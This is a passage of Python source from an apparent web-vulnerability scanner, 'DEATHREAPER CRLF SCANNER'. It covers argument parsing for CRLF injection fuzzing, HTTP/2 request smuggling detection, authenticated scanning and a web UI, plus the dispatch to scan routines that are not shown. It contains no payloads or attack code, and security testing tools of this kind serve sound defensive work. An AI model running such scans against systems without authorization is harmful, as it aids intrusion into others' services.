    ap.add_argument("--retries", type=int, default=DEFAULT_RETRIES, help="Retry count for failed requests")
    ap.add_argument("--backoff", type=float, default=DEFAULT_BACKOFF, help="Retry backoff factor")
    ap.add_argument("--rate", type=float, default=DEFAULT_RATE_LIMIT, help="Rate limit (delay) between requests (seconds)")
    ap.add_argument("--proxy", help="Proxy to route all traffic through (e.g. http://127.0.0.1:8080)")
    ap.add_argument("--follow-redirects", action="store_true", help="Follow HTTP redirects during scanning")
    ap.add_argument("--http2", action="store_true", help="Enable HTTP/2 scanning for HTTPS targets (uses httpx)")
    ap.add_argument("-H", "--header", action="append", help="Additional header(s) to include (e.g. 'X-Api-Key: VALUE')", dest="header")
    ap.add_argument("-C", "--cookie", action="append", help="Cookie(s) to include (name=value)", dest="cookie")
    ap.add_argument("--auth", help="Authentication helper (basic:user:pass, bearer:token, or raw:Name: Value)")
    ap.add_argument("--body-params", help="Comma-separated x-www-form-urlencoded POST parameter names to fuzz")
    ap.add_argument("--login-url", help="URL to perform an initial login (authentication) before scanning")
    ap.add_argument("--login-data", help="POST data for login (e.g. 'username=admin&password=pass')"
                                        " – if provided, a POST request is used for login, otherwise GET")
    # New flags for smuggle-h2 detection and verbose logging
    ap.add_argument("--smuggle-h2", action="store_true", help="Enable HTTP/2 to HTTP/1 smuggling scan via CRLF injection")
    ap.add_argument("--verbose", action="store_true", help="Enable verbose Nmap-style output during scanning")
    ap.add_argument("--canary-path", help="Custom path for the smuggled follow-up request (default: auto-generated)")
    # New flags for raw request file scanning
    ap.add_argument("--request-file", action="append",
                    help="Path(s) to raw HTTP request file(s) (Burp/ZAP style). If set, scanner uses these instead of URL(s).")
    ap.add_argument("--req-scheme", choices=["http", "https"], default="https",
                    help="Default scheme when the request line is relative and only Host: is present (default: https).")
    ap.add_argument("--req-placeholder", default="{{CRLF}}",
                    help="Marker to replace in the request line/headers/body with CRLF payloads (default: {{CRLF}}).")
    ap.add_argument("--fuzz-headers", action="store_true",
                    help="Also fuzz header values if no placeholder is present.")
    # Output files
    ap.add_argument("--out-json", help="Write findings to JSON file (path).")
    ap.add_argument("--out-csv", help="Write findings to CSV file (path).")
    # Web UI
    ap.add_argument(
        "--ui",
        action="store_true",
        help=(
            "Launch the built‑in interactive Web UI (powered by FastAPI). When this flag "
            "is present, the scanner will start a web server on the specified port "
            "instead of running a CLI scan. Use the UI to select options and view "
            "results in your browser."
        ),
    )
    ap.add_argument(
        "--ui-port",
        type=int,
        default=8965,
        help="Port on which to serve the Web UI (when --ui is used).",
    )
    ap.add_argument(
        "--ask-ui",
        action="store_true",
        help=(
            "If no targets are provided on the command line, prompt whether to start "
            "the Web UI. This is useful when you want an interactive choice between "
            "CLI and UI modes."
        ),
    )
    # (Omitting HAR, JUnit, and serve/UI args for brevity in this snippet)
    args = ap.parse_args()

    # Print the banner once at program start
    try:
        print(BANNER)
    except Exception:
        # Fallback: print plain banner without colour codes if output encoding fails
        print("DEATHREAPER CRLF SCANNER")

    # Expand URL set from --url-file (if any)
    all_urls: List[str] = list(args.url or [])
    if getattr(args, "url_file", None):
        try:
            file_urls = load_urls_from_files(args.url_file, args.assume_scheme)
            all_urls.extend(file_urls)
        except Exception as e:
            print(f"[!] Error loading URL file(s): {e}", file=sys.stderr)

    # No targets provided – optionally launch UI or error out
    if not all_urls and not args.request_file:
        if args.ui or args.ask_ui:
            if FastAPI is None:
                print("[-] FastAPI not installed. Run: pip install fastapi uvicorn", file=sys.stderr)
                sys.exit(1)
            app = build_app()
            print(f"[+] Web UI on http://127.0.0.1:{args.ui_port}")
            uvicorn.run(app, host="127.0.0.1", port=args.ui_port)
            sys.exit(0)
        # otherwise error
        ap.print_usage()
        print("[-] Error: Provide URLs/--url-file or a --request-file (or run with --ui).", file=sys.stderr)
        sys.exit(1)

    # If explicit --ui regardless of targets, prefer UI
    if args.ui:
        if FastAPI is None:
            print("[-] FastAPI not installed. Run: pip install fastapi uvicorn", file=sys.stderr)
            sys.exit(1)
        app = build_app()
        print(f"[+] Web UI on http://127.0.0.1:{args.ui_port}")
        uvicorn.run(app, host="127.0.0.1", port=args.ui_port)
        sys.exit(0)

    # Main scanning logic
    engine = Engine(args)
    if args.request_file:
        engine.scan_request_files(args.request_file, args.req_scheme)
    elif args.smuggle_h2:
        try:
            engine.smuggle_h2_scan(all_urls)
        except Exception as e:
            print(f"[!] Smuggle scan failed: {e}", file=sys.stderr)
    else:
        engine.scan(all_urls)

    # Write output files if requested
    if getattr(args, "out_json", None):
        write_findings_json(args.out_json, engine.findings)
        print(f"[+] Wrote JSON findings: {args.out_json}")
    if getattr(args, "out_csv", None):
        write_findings_csv(args.out_csv, engine.findings)
        print(f"[+] Wrote CSV findings: {args.out_csv}")